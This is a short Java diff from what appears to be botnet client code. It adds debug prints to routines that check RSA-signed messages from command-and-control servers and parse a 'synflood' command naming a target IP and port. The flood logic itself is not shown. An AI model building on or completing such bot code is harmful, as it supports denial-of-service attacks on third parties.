@@ -171,7 +171,7 @@ public class Behavior {
 					// System.out.println("signature" + msgs[2]);
 					// System.out.println(" pk " +
 					// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
-				
+				System.err.println("NcommandSize: "+nServ.getCommandConquerIps().getSize());
 					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerIps().get(0).getValue2())) {
 						Pairs<Integer, String> data = new Pairs<>();
 						data.setValue1(msgHashList.getSize() + 1);
@@ -221,9 +221,7 @@ public class Behavior {
 				updateCecInfo(msg);
 		}
 		if (msg.startsWith("synflood")) {
-			// scompongo messaggio al fine di riempire i campi, codifica
-			// particolare <SA>
-			// TODO da fare
+			System.out.println("Inizio SynFlood");
 			String[] msgs = msg.split("<TT>");
 			IP ipDest = new IP(msgs[1].toString());
 			Integer portDest = Integer.parseInt(msgs[2].toString());
